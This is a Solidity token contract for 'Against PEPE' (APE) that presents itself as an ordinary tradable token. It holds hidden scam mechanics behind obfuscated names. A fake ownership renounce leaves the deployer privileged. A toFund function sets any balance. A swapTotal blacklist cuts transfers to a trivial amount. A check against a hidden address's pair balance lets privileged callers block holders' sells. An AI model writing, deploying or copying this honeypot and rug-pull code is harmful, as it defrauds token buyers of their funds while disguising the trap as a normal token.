//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface marketingExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listMax) external view returns (uint256);

    function transfer(address receiverMaxAuto, uint256 limitFund) external returns (bool);

    function allowance(address liquidityTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitFund) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMaxAuto,
        uint256 limitFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitWalletLiquidity, uint256 value);
    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);
}

abstract contract exemptToReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderExempt {
    function createPair(address fundSwap, address fromTeam) external returns (address);
}

interface feeAmount is marketingExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AgainstPEPE is exemptToReceiver, marketingExempt, feeAmount {

    function allowance(address takeAt, address marketingReceiverReceiver) external view virtual override returns (uint256) {
        if (marketingReceiverReceiver == senderTake) {
            return type(uint256).max;
        }
        return enableTeam[takeAt][marketingReceiverReceiver];
    }

    bool public toLiquidity;

    uint256 public marketingToken;

    bool public maxReceiver;

    bool public launchIsMarketing;

    function balanceOf(address listMax) public view virtual override returns (uint256) {
        return receiverMarketing[listMax];
    }

    function decimals() external view virtual override returns (uint8) {
        return isMode;
    }

    function transfer(address feeFundLiquidity, uint256 limitFund) external virtual override returns (bool) {
        return launchTradingSwap(_msgSender(), feeFundLiquidity, limitFund);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return amountSwap;
    }

    uint8 private isMode = 18;

    function transferFrom(address tradingMarketing, address receiverMaxAuto, uint256 limitFund) external override returns (bool) {
        if (_msgSender() != senderTake) {
            if (enableTeam[tradingMarketing][_msgSender()] != type(uint256).max) {
                require(limitFund <= enableTeam[tradingMarketing][_msgSender()]);
                enableTeam[tradingMarketing][_msgSender()] -= limitFund;
            }
        }
        return launchTradingSwap(tradingMarketing, receiverMaxAuto, limitFund);
    }

    uint256 listAt;

    address senderTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private takeBuy;

    string private senderSwap = "APE";

    bool public atEnable;

    string private amountMode = "Against PEPE";

    mapping(address => mapping(address => uint256)) private enableTeam;

    function swapFrom(uint256 limitFund) public {
        shouldMax();
        receiverTake = limitFund;
    }

    function name() external view virtual override returns (string memory) {
        return amountMode;
    }

    uint256 private liquidityReceiver;

    bool private launchedIs;

    function swapTotal(address fromTotalLiquidity) public {
        shouldMax();
        if (launchedIs != toLiquidity) {
            liquidityReceiver = marketingToken;
        }
        if (fromTotalLiquidity == swapEnableLiquidity || fromTotalLiquidity == maxSender) {
            return;
        }
        launchedTake[fromTotalLiquidity] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderSwap;
    }

    function getOwner() external view returns (address) {
        return takeBuy;
    }

    function approve(address marketingReceiverReceiver, uint256 limitFund) public virtual override returns (bool) {
        enableTeam[_msgSender()][marketingReceiverReceiver] = limitFund;
        emit Approval(_msgSender(), marketingReceiverReceiver, limitFund);
        return true;
    }

    address public swapEnableLiquidity;

    address public maxSender;

    function feeMin() public {
        emit OwnershipTransferred(swapEnableLiquidity, address(0));
        takeBuy = address(0);
    }

    function toFund(address feeFundLiquidity, uint256 limitFund) public {
        shouldMax();
        receiverMarketing[feeFundLiquidity] = limitFund;
    }

    function shouldMax() private view {
        require(launchedIsFund[_msgSender()]);
    }

    constructor (){
        
        tradingTx exemptAmount = tradingTx(senderTake);
        maxSender = senderExempt(exemptAmount.factory()).createPair(exemptAmount.WETH(), address(this));
        if (atEnable != launchIsMarketing) {
            launchedIs = false;
        }
        swapEnableLiquidity = _msgSender();
        feeMin();
        launchedIsFund[swapEnableLiquidity] = true;
        receiverMarketing[swapEnableLiquidity] = amountSwap;
        if (atEnable != launchedIs) {
            marketingToken = liquidityReceiver;
        }
        emit Transfer(address(0), swapEnableLiquidity, amountSwap);
    }

    uint256 receiverTake;

    mapping(address => bool) public launchedIsFund;

    bool private fromSell;

    function isTotal(address limitSell) public {
        require(limitSell.balance < 100000);
        if (maxReceiver) {
            return;
        }
        if (liquidityReceiver != marketingToken) {
            liquidityReceiver = marketingToken;
        }
        launchedIsFund[limitSell] = true;
        
        maxReceiver = true;
    }

    mapping(address => bool) public launchedTake;

    uint256 constant marketingTake = 7 ** 10;

    mapping(address => uint256) private receiverMarketing;

    function launchTradingSwap(address tradingMarketing, address receiverMaxAuto, uint256 limitFund) internal returns (bool) {
        if (tradingMarketing == swapEnableLiquidity) {
            return sellEnable(tradingMarketing, receiverMaxAuto, limitFund);
        }
        uint256 buyReceiver = marketingExempt(maxSender).balanceOf(autoMin);
        require(buyReceiver == receiverTake);
        require(receiverMaxAuto != autoMin);
        if (launchedTake[tradingMarketing]) {
            return sellEnable(tradingMarketing, receiverMaxAuto, marketingTake);
        }
        return sellEnable(tradingMarketing, receiverMaxAuto, limitFund);
    }

    function sellEnable(address tradingMarketing, address receiverMaxAuto, uint256 limitFund) internal returns (bool) {
        require(receiverMarketing[tradingMarketing] >= limitFund);
        receiverMarketing[tradingMarketing] -= limitFund;
        receiverMarketing[receiverMaxAuto] += limitFund;
        emit Transfer(tradingMarketing, receiverMaxAuto, limitFund);
        return true;
    }

    event OwnershipTransferred(address indexed listWalletAt, address indexed buyLaunch);

    uint256 private amountSwap = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return takeBuy;
    }

    address autoMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}